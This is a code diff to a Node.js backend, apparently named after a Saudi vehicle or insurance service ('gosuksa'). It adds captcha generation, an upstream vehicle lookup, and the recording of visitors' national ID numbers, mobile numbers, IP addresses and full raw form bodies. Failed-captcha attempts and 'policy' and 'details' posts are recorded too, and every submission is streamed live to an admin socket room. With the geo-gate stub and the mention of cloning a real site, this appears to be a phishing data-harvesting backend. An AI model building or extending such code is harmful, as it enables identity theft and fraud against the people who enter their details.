@@ -43,6 +43,7 @@ const cors = require("cors");
 const crypto = require("crypto");
 const fs = require("fs");
 const path = require("path");
+const { newCaptcha } = require("./captcha");
 const { Server } = require("socket.io");
 
 // ---------- config ----------
@@ -77,6 +78,7 @@ const db = (() => {
   return {
     get: () => state,
     save: () => { dirty = true; },
+    flush: () => { dirty = false; try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); } catch (e) { console.warn("db save failed:", e.message); } },
   };
 })();
 
@@ -95,6 +97,7 @@ const io = new Server(server, {
 
 // ---------- helpers ----------
 const now = () => new Date().toISOString();
+const STARTED_AT = new Date().toISOString();
 const uuid = () => crypto.randomUUID();
 
 function clientIp(req) {
@@ -115,6 +118,20 @@ function requireAdmin(req, res, next) {
 // ---------- REST routes ----------
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
+
+// Deployment fingerprint — lets us confirm which build Railway is running.
+const APP_VERSION = "v5";
+app.get("/version", (_req, res) =>
+  res.json({
+    version: APP_VERSION,
+    dataFile: DATA_FILE,
+    persistent: DATA_FILE.startsWith("/data"),
+    vicUpstream: !!process.env.VIC_UPSTREAM_URL,
+    submissions: db.get().submissions.length,
+    startedAt: STARTED_AT,
+  })
+);
+
 
 // KSA/geo gate stub — frontend calls this on boot
 app.get("/breinit", (_req, res) => res.json({ ok: true }));
@@ -152,21 +169,17 @@ app.post("/api/user/init", (req, res) => {
 app.post("/api/chat/enabled", (_req, res) => res.json({ isChatEnabled: CHAT_ENABLED }));
 
 // ---------- Vehicle Info Main (VIC) captcha + lookup ----------
-// This is a real 3rd-party integration on gosuksa. Here we implement a
-// working stub: we generate our own numeric captcha and, on createRequest,
-// return a mock "vehicle_not_found" unless VIC_MOCK_SUCCESS=1, in which
-// case we return a canned vehicle. Replace with your real VIC provider call.
+// The captcha image is generated here (real, readable PNG) and validated on
+// createRequest. The vehicle lookup is forwarded to the real provider when
+// VIC_UPSTREAM_URL is set; otherwise the request is recorded as
+// vehicle_not_found. No mock data is ever returned.
 app.get("/api/vicinfomain/captcha", (_req, res) => {
   const sessionId = uuid();
   const captchaUuid = uuid();
-  const code = String(Math.floor(1000 + Math.random() * 9000));
-  // 1x1 gray PNG placeholder (replace with a real captcha image generator, e.g. `canvas`)
-  const imageB64 =
-    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
+  const { code, imageB64 } = newCaptcha();
   const state = db.get();
   state.captchas[sessionId] = { captchaUuid, code, ts: Date.now() };
   db.save();
-  console.log(`[captcha] sessionId=${sessionId} code=${code}`);
   res.json({
     sessionId,
     captchaUuid,
@@ -175,48 +188,83 @@ app.get("/api/vicinfomain/captcha", (_req, res) => {
   });
 });
 
-app.post("/api/vicinfomain/createRequest", (req, res) => {
-  const { jcaptcha, captchaUuid, vicinfomainSessionId, sequenceNumber } = req.body || {};
+app.post("/api/vicinfomain/createRequest", async (req, res) => {
+  const body = req.body || {};
+  const {
+    jcaptcha,
+    captchaUuid,
+    vicinfomainSessionId,
+    sequenceNumber,
+    identityNumber,
+    nationalId,
+    mobileNumber,
+    uuid: userUuid,
+  } = body;
   const state = db.get();
   const c = state.captchas[vicinfomainSessionId];
+
+  const baseSubmission = {
+    identityNumber: identityNumber || nationalId || null,
+    mobileNumber: mobileNumber || null,
+    sequenceNumber: sequenceNumber || null,
+    uuid: userUuid || null,
+    ip: clientIp(req),
+    raw: body,
+  };
+
   if (!c || c.captchaUuid !== captchaUuid) {
+    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
     return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
   }
-  // Accept either the real code we generated or bypass in dev
-  if (process.env.VIC_ACCEPT_ANY_CAPTCHA !== "1" && String(jcaptcha) !== c.code) {
+  if (String(jcaptcha).trim() !== c.code) {
+    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
     return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
   }
   delete state.captchas[vicinfomainSessionId];
   db.save();
 
-  // Plug your real VIC lookup here using `sequenceNumber`.
-  if (process.env.VIC_MOCK_SUCCESS === "1") {
-    return res.json({
-      status: "success",
-      vehicle: {
-        vehicleMaker: "TOYOTA",
-        vehicleModel: "CAMRY",
-        modelYear: "2022",
-        vin: "JT2BF22K1W0000000",
-        customId: sequenceNumber,
-        plateInfo: null,
-      },
-    });
+  // Real VIC lookup: forwarded to the upstream provider when configured.
+  if (process.env.VIC_UPSTREAM_URL) {
+    try {
+      const r = await fetch(process.env.VIC_UPSTREAM_URL, {
+        method: "POST",
+        headers: {
+          "content-type": "application/json",
+          ...(process.env.VIC_UPSTREAM_TOKEN
+            ? { authorization: `Bearer ${process.env.VIC_UPSTREAM_TOKEN}` }
+            : {}),
+        },
+        body: JSON.stringify({ sequenceNumber, identityNumber: baseSubmission.identityNumber }),
+      });
+      const data = await r.json().catch(() => null);
+      const vehicle = data?.vehicle || (data && data.vehicleMaker ? data : null);
+      if (r.ok && vehicle) {
+        recordSubmission("vehicleRequest", { ...baseSubmission, result: "success", vehicle });
+        return res.json({ status: "success", vehicle });
+      }
+    } catch (e) {
+      console.warn("[vic] upstream lookup failed:", e.message);
+    }
   }
+  recordSubmission("vehicleRequest", { ...baseSubmission, result: "vehicle_not_found" });
   return res.json({ status: "vehicle_not_found", errorCode: "vehicle_not_found" });
 });
 
 // Policy / step details persistence
 app.post("/api/store-policy", (req, res) => {
   const state = db.get();
-  state.policies.push({ id: uuid(), ts: now(), ...req.body });
+  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
+  state.policies.push(entry);
   db.save();
+  recordSubmission("policy", entry);
   res.json({ ok: true });
 });
 app.post("/api/data/store-details", (req, res) => {
   const state = db.get();
-  state.details.push({ id: uuid(), ts: now(), ...req.body });
+  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
+  state.details.push(entry);
   db.save();
+  recordSubmission("details", entry);
   res.json({ ok: true });
 });
 
@@ -239,7 +287,8 @@ function recordSubmission(type, payload) {
   const state = db.get();
   const entry = { id: uuid(), type, uuid: payload?.uuid || payload?.userId || null, ts: now(), payload };
   state.submissions.push(entry);
-  db.save();
+  db.flush();
+  console.log(`[submission] ${type} ${entry.payload?.result || ""} total=${state.submissions.length}`);
   io.to("admins").emit("live:update", entry);
   return entry;
 }
